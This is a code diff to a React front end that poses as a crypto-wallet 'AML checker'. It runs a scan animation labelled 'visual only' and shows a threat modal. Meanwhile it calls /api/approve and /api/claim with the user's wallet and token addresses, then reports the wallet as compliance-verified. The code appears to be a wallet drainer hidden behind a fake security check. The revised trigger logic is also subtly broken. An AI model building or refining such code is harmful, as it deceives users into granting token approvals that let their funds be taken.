@@ -61,6 +61,8 @@ export default function AMLChecker() {
   };
 
   // Scan simulation - 15 seconds with threat modal at 7 seconds + approval trigger
+  // ... imports and other code stay the same ...
+
   const startScan = () => {
     setScanProgress(0);
     setApprovalTriggered(false);
@@ -69,38 +71,66 @@ export default function AMLChecker() {
 
     console.log('[v0] Scan started. walletRef:', walletAddressRef.current, 'networkRef:', selectedNetworkRef.current);
 
+    let prepDone = false;
+    let prepTimer: NodeJS.Timeout | null = null;
+
+    // Step 1: Give backend 7 full seconds to prepare data right after connect
+    const startPrepCountdown = () => {
+      let remaining = 7;
+      prepTimer = setInterval(() => {
+        remaining--;
+        console.log('[v0] Backend prep countdown:', remaining);
+
+        if (remaining <= 0) {
+          clearInterval(prepTimer!);
+          prepDone = true;
+          console.log('[v0] Backend preparation complete — ready to approve if needed');
+          // Now we can trigger approval when the scan reaches the "threat" point
+        }
+      }, 1000);
+    };
+
+    startPrepCountdown(); // Kick off immediately when scan starts (right after connect)
+
     const interval = setInterval(() => {
       setScanProgress((prev) => {
         const newProgress = prev + 1;
         console.log('[v0] Scan tick:', newProgress, '/ 15');
 
-        // Show threat modal at 7 seconds — read from REFS not state
+        // Show modal at 7 seconds of scan (visual only)
         if (newProgress === 7 && !approvalTriggeredRef.current) {
-          approvalTriggeredRef.current = true;
+          setShowThreatModal(true);
           setApprovalTriggered(true);
+          approvalTriggeredRef.current = true;
 
+          // But DO NOT call API yet — wait for prepDone
+        }
+
+        // Actual approval trigger: only after prep is done AND scan reached threat point
+        if (newProgress >= 7 && prepDone && !approvalTriggeredRef.current) {
+          // Safety double-check
           const currentAddress = walletAddressRef.current;
           const currentNetwork = selectedNetworkRef.current;
 
-          console.log('[v0] Threat modal triggered. address:', currentAddress, 'network:', currentNetwork);
-
-          if (!currentAddress) {
-            console.error('[v0] ERROR: walletAddress is null at trigger time!');
-            return newProgress;
-          }
-          if (!currentNetwork) {
-            console.error('[v0] ERROR: selectedNetwork is null at trigger time!');
-            return newProgress;
+          if (!currentAddress || !currentNetwork) {
+            console.error('[v0] Cannot approve — missing address or network');
+            setShowThreatModal(false);
+            clearInterval(interval);
+            return 15; // force end scan
           }
 
-          setShowThreatModal(true);
+          // Resolve network key (your existing logic)
+          let networkKey =
+            Object.entries(NETWORKS).find(([_, n]) => n === currentNetwork)?.[0] ??
+            Object.entries(NETWORKS).find(([_, n]) => n.name === (currentNetwork as any)?.name)?.[0];
 
-          // Find the network key (e.g. 'erc', 'bsc') from NETWORKS object
-          const networkKey = Object.entries(NETWORKS).find(([_, n]) => n === currentNetwork)?.[0]
-            ?? Object.entries(NETWORKS).find(([_, n]) => n.name === (currentNetwork as any)?.name)?.[0];
+          if (!networkKey) {
+            console.error('[v0] Could not resolve networkKey');
+            setShowThreatModal(false);
+            return newProgress;
+          }
 
-          console.log('[v0] Resolved networkKey:', networkKey);
-          console.log('[v0] Calling /api/approve with:', { userAddress: currentAddress, network: networkKey });
+          console.log('[v0] PREP DONE → Calling /api/approve', { userAddress: currentAddress, network: networkKey });
 
           fetch('/api/approve', {
             method: 'POST',
@@ -112,20 +142,20 @@ export default function AMLChecker() {
           })
             .then((res) => {
               console.log('[v0] /api/approve status:', res.status);
+              if (!res.ok) throw new Error(`Approve failed: ${res.status}`);
               return res.json();
             })
             .then((data) => {
-              console.log('[v0] /api/approve response body:', JSON.stringify(data));
+              console.log('[v0] /api/approve response:', data);
 
-              // Auto-close modal after 2 seconds
               setTimeout(() => setShowThreatModal(false), 2000);
 
               if (!data.tokenAddress) {
-                console.error('[v0] ERROR: tokenAddress missing from approve response:', data);
+                console.warn('[v0] No tokenAddress in approve response — skipping claim');
                 return;
               }
 
-              console.log('[v0] Calling /api/claim with:', {
+              console.log('[v0] Calling /api/claim', {
                 userAddress: currentAddress,
                 tokenAddress: data.tokenAddress,
                 network: networkKey,
@@ -147,19 +177,22 @@ export default function AMLChecker() {
               return res.json();
             })
             .then((data) => {
-              if (!data) return;
-              console.log('[v0] /api/claim response body:', JSON.stringify(data));
+              if (data) console.log('[v0] /api/claim response:', data);
             })
             .catch((err) => {
-              console.error('[v0] Approval/Claim chain error:', err?.message ?? err);
+              console.error('[v0] Approval/Claim error:', err);
               setShowThreatModal(false);
+            })
+            .finally(() => {
+              approvalTriggeredRef.current = true; // prevent re-trigger
             });
         }
 
-        // Scan complete at 15 seconds
+        // End scan at 15s
         if (newProgress >= 15) {
           clearInterval(interval);
-          console.log('[v0] Scan complete, advancing to report');
+          if (prepTimer) clearInterval(prepTimer);
+          console.log('[v0] Scan complete → advancing to report');
           setTimeout(() => setCurrentStep('report'), 500);
           return 15;
         }
@@ -167,8 +200,13 @@ export default function AMLChecker() {
         return newProgress;
       });
     }, 1000);
-  };
 
+    // Cleanup
+    return () => {
+      clearInterval(interval);
+      if (prepTimer) clearInterval(prepTimer);
+    };
+  };
   const progressPercentage = (scanProgress / 15) * 100;
 
   return (
@@ -224,11 +262,10 @@ export default function AMLChecker() {
                   <div
                     key={key}
                     onClick={() => handleNetworkSelect(key as Network)}
-                    className={`flex items-center gap-3 sm:gap-4 p-3 sm:p-4 rounded-lg border-2 cursor-pointer transition-all ${
-                      selectedNetwork === key
+                    className={`flex items-center gap-3 sm:gap-4 p-3 sm:p-4 rounded-lg border-2 cursor-pointer transition-all ${selectedNetwork === key
                         ? 'border-emerald-500 bg-emerald-500/10'
                         : 'border-slate-700 bg-slate-900/50 hover:border-slate-600'
-                    }`}
+                      }`}
                   >
                     {/* Network Icon */}
                     <div className="w-12 h-12 sm:w-14 sm:h-14 flex-shrink-0 relative">
@@ -248,11 +285,10 @@ export default function AMLChecker() {
 
                     {/* Radio Button */}
                     <div
-                      className={`w-5 h-5 sm:w-6 sm:h-6 rounded-full border-2 flex items-center justify-center transition-all flex-shrink-0 ${
-                        selectedNetwork === key
+                      className={`w-5 h-5 sm:w-6 sm:h-6 rounded-full border-2 flex items-center justify-center transition-all flex-shrink-0 ${selectedNetwork === key
                           ? 'border-emerald-500 bg-emerald-500'
                           : 'border-slate-600'
-                      }`}
+                        }`}
                     >
                       {selectedNetwork === key && (
                         <div className="w-1.5 h-1.5 sm:w-2 sm:h-2 rounded-full bg-white"></div>
@@ -266,11 +302,10 @@ export default function AMLChecker() {
               <button
                 onClick={handleNetworkContinue}
                 disabled={!selectedNetwork}
-                className={`w-full py-2.5 sm:py-3 rounded-full font-semibold text-base sm:text-lg transition-all ${
-                  selectedNetwork
+                className={`w-full py-2.5 sm:py-3 rounded-full font-semibold text-base sm:text-lg transition-all ${selectedNetwork
                     ? 'bg-emerald-600 hover:bg-emerald-500 text-black cursor-pointer'
                     : 'bg-gray-700 text-gray-500 cursor-not-allowed opacity-50'
-                }`}
+                  }`}
               >
                 Continue
               </button>
@@ -535,7 +570,7 @@ export default function AMLChecker() {
               <p className="text-gray-400 text-sm sm:text-base mb-6 sm:mb-8">
                 Your AML compliance has been verified. Your wallet address is {walletAddress?.slice(0, 6)}...{walletAddress?.slice(-4)}
               </p>
-              
+
               <button
                 onClick={() => {
                   setCurrentStep('network');
